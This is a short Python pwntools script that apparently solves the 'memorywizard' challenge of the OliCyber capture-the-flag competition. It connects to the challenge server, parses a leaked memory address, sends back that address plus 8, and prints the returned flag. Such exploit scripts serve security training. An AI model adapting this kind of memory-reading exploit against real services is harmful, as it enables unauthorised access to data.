from pwn import *

r = remote("memorywizard.challs.olicyber.it", 21001)
r.recvuntil(b"return to ")
addr = int(r.recvline()[:-2].decode(), 16)
r.sendline(hex(addr+8).encode())
r.recvuntil(b'DATA": ')
flag = r.recvline().decode().strip()
print(flag)
